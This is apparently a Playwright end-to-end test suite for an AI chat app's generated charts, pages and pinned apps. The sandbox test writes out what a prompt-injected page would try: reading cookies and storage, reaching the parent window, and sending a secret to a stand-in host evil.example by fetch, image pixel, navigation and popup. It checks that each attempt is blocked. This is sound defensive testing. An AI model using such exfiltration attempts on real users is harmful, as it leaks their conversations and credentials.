import { expect, test, type Page } from '@playwright/test';

const mod = process.platform === 'darwin' ? 'Meta' : 'Control';

/**
 * Show me, end to end (ADR 0034): a chart beside the chat, a new version and
 * what changed; a page that runs sealed off (and the ways a hostile one would
 * try to get out, each refused); a page with a link out that starts with its
 * code off; pinning one as an app, refreshing it, finding it with ⌘K, the
 * Activity page, and the phone.
 */
test.beforeEach(async ({ request }) => {
  await request.patch('/api/settings', { data: { onboarded: true, profile: { name: 'Ada' } } });
});

async function ask(page: Page, text: string) {
  const composer = page.getByRole('textbox', { name: 'Message Conch' });
  await composer.fill(text);
  await composer.press('Enter');
}

test('a chart opens beside the chat; a new version shows what changed', async ({
  page,
  request,
}) => {
  await page.goto('/');
  await ask(page, 'make me a chart of my visitors this week');
  const panel = page.getByRole('region', { name: 'Visitors this week' });
  await expect(panel).toBeVisible();
  await expect(
    panel.getByRole('img', { name: /bar chart of Visitors across 5 points/ }),
  ).toBeVisible();
  await expect(
    page.getByRole('button', { name: /Visitors this week.*Chart · made for you.*Showing/ }),
  ).toBeVisible();

  // The same numbers, as a table.
  await panel.getByRole('radio', { name: 'Table' }).click();
  await expect(panel.getByRole('row', { name: /Fri 260 visitors/ })).toBeVisible();

  await ask(page, 'make it a line');
  await expect(
    page.getByRole('button', { name: /Chart · version 2 · Made it a line/ }),
  ).toBeVisible();
  await expect(panel.getByRole('img', { name: /line chart/ })).toBeVisible();
  await panel.getByRole('tab', { name: 'Changes' }).click();
  await expect(panel.getByText('"type": "line",')).toBeVisible();
  await expect(panel.getByText('"type": "bar",')).toBeVisible();

  // Back to the first one from its card in the chat.
  await page.getByRole('button', { name: /Chart · made for you/ }).click();
  await panel.getByRole('tab', { name: 'View' }).click();
  await expect(panel.getByRole('img', { name: /bar chart/ })).toBeVisible();

  // A download is a download, named like the thing.
  const id = /a_[A-Za-z0-9]+/.exec(
    JSON.stringify(await (await request.get('/api/artifacts')).json()),
  )?.[0];
  const file = await request.get(`/api/artifacts/${id}/versions/1/download`);
  expect(file.headers()['content-disposition']).toMatch(
    /^attachment; filename="Visitors this week\.json"/,
  );
  expect(file.headers()['x-content-type-options']).toBe('nosniff');

  await panel.getByRole('button', { name: 'Close' }).click();
  await expect(panel).toHaveCount(0);
});

test('a page runs sealed off: no cookies, no Conch, no network, no way out', async ({ page }) => {
  // Anything that reached the network for evil.example lands here (CSP stops it before).
  const leaks: string[] = [];
  await page.context().route(/evil\.example/, async (route) => {
    leaks.push(route.request().url());
    await route.fulfill({ status: 204 });
  });
  await page.goto('/');
  await ask(page, 'make me a page that works out a tip');
  const panel = page.getByRole('region', { name: 'Tip calculator' });
  await expect(panel).toBeVisible();
  const frame = page.frameLocator('iframe[title="Tip calculator"]');
  await expect(frame.getByText('Tip: 6.00')).toBeVisible();
  await frame.getByRole('spinbutton', { name: 'Bill' }).fill('100');
  await expect(frame.getByText('Tip: 15.00')).toBeVisible();

  const iframe = page.locator('iframe[title="Tip calculator"]');
  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts');
  const inside = page.frames().find((f) => f.url().includes('/frame'));
  expect(inside).toBeDefined();
  // Everything a prompt-injected page would try, from inside it.
  const tries = await inside!.evaluate(async () => {
    const attempt = async (f: () => unknown) => {
      try {
        const r = await f();
        return `ok:${String(r)}`;
      } catch (e) {
        return `refused:${(e as Error).name}`;
      }
    };
    const img = await new Promise<string>((resolve) => {
      document.addEventListener(
        'securitypolicyviolation',
        (e) => resolve(`blocked:${e.violatedDirective}`),
        { once: true },
      );
      const i = new Image();
      i.src = 'https://evil.example/pixel.png?d=secret';
      setTimeout(() => resolve('no-report'), 2000);
    });
    return {
      origin: self.origin,
      cookie: await attempt(() => document.cookie),
      storage: await attempt(() => localStorage.length),
      parent: await attempt(() => window.parent.document.title),
      fetchApi: await attempt(() => fetch('/api/state').then((r) => r.status)),
      fetchOut: await attempt(() => fetch('https://evil.example/?d=secret').then((r) => r.status)),
      top: await attempt(() => {
        window.top!.location.href = 'https://evil.example/?d=secret';
        return 'moved';
      }),
      popup: await attempt(() => window.open('https://evil.example/?d=secret')),
      img,
    };
  });
  expect(tries.origin).toBe('null');
  expect(tries.cookie).toMatch(/^refused:SecurityError/);
  expect(tries.storage).toMatch(/^refused:SecurityError/);
  expect(tries.parent).toMatch(/^refused:SecurityError/);
  expect(tries.fetchApi).toMatch(/^refused:TypeError/);
  expect(tries.fetchOut).toMatch(/^refused:TypeError/);
  expect(tries.top).toMatch(/^refused:/);
  expect(tries.popup).toBe('ok:null');
  expect(tries.img).toMatch(/^blocked:img-src/);
  expect(leaks).toEqual([]);
  // Conch is still here, where it was.
  await expect(page).toHaveURL(/\/c\//);
});

test('a page with a link out starts with its code off, until you say', async ({ page }) => {
  await page.goto('/');
  await ask(page, 'make me a page with a link to the best article');
  const panel = page.getByRole('region', { name: 'Reading list' });
  await expect(panel.getByText('Shown with its code off')).toBeVisible();
  const frame = page.frameLocator('iframe[title="Reading list"]');
  await expect(frame.getByRole('heading', { name: 'Reading list' })).toBeVisible();
  await expect(frame.locator('body[data-ran]')).toHaveCount(0);
  // With its code off, a link has nowhere to go.
  const leaks: string[] = [];
  await page.context().route(/evil\.example/, async (route) => {
    leaks.push(route.request().url());
    await route.fulfill({ status: 204 });
  });
  await frame.getByRole('link', { name: 'The best article' }).click();
  await expect(frame.getByRole('heading', { name: 'Reading list' })).toBeVisible();

  await panel.getByRole('button', { name: 'Run it anyway' }).click();
  await expect(frame.locator('body[data-ran="yes"]')).toHaveCount(1);
  // Running, a link asks first, showing where it goes, and opens apart from Conch.
  await frame.getByRole('link', { name: 'The best article' }).click();
  await expect(page.getByText('Open evil.example?')).toBeVisible();
  await expect(page.getByText('https://evil.example/?q=everything-you-said')).toBeVisible();
  await expect(frame.getByRole('heading', { name: 'Reading list' })).toBeVisible();
  expect(leaks).toEqual([]);
});

test('pinned as an app: in the sidebar, opens on its own page, refreshes with fresh data', async ({
  page,
}) => {
  await page.goto('/');
  await ask(page, 'make me a chart of my visitors this week');
  const panel = page.getByRole('region', { name: 'Visitors this week' });
  await panel.getByRole('button', { name: 'Pin as an app' }).click();
  await expect(page.getByText('“Visitors this week” is in your sidebar')).toBeVisible();

  const apps = page.getByRole('region', { name: 'Apps' });
  await apps.getByRole('button', { name: 'Visitors this week' }).click();
  await expect(page).toHaveURL(/\/apps\/a_/);
  const app = page.getByRole('region', { name: 'Visitors this week' });
  await expect(app.getByRole('img', { name: /bar chart/ })).toBeVisible();

  await app.getByRole('button', { name: 'Refresh' }).click();
  await expect(app.getByText('Fresh numbers')).toBeVisible();
  await app.getByRole('radio', { name: 'Table' }).click();
  await expect(app.getByRole('row', { name: /Today 300 visitors/ })).toBeVisible();
  // The refresh chat stays out of your chat list.
  await expect(page.getByRole('link', { name: /Refresh: Visitors/ })).toHaveCount(0);

  // ⌘K finds it by name.
  await page.goto('/');
  await page.keyboard.press(`${mod}+k`);
  await page.getByRole('combobox').fill('visitors');
  await page.getByRole('option', { name: /Visitors this week.*Chart · pinned/ }).click();
  await expect(page).toHaveURL(/\/apps\/a_/);

  // Activity says what was made.
  await page.goto('/activity');
  await page.getByRole('radio', { name: 'Made' }).click();
  await expect(page.getByText('Made “Visitors this week”').first()).toBeVisible();
});

test('on a phone, it slides over the chat', async ({ browser }) => {
  const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const page = await context.newPage();
  await page.goto('/');
  await ask(page, 'make me a table of my budget');
  const sheet = page.getByRole('dialog', { name: 'Made for you' });
  await expect(sheet.getByRole('region', { name: 'Budget', exact: true })).toBeVisible();
  await sheet.getByRole('button', { name: 'Cost' }).click();
  await expect(sheet.getByRole('columnheader', { name: 'Cost' })).toHaveAttribute(
    'aria-sort',
    'ascending',
  );
  await sheet.getByRole('button', { name: 'Close' }).click();
  await expect(sheet).toHaveCount(0);
  await expect(page.getByRole('button', { name: /Budget.*Table/ })).toBeVisible();
  await context.close();
});
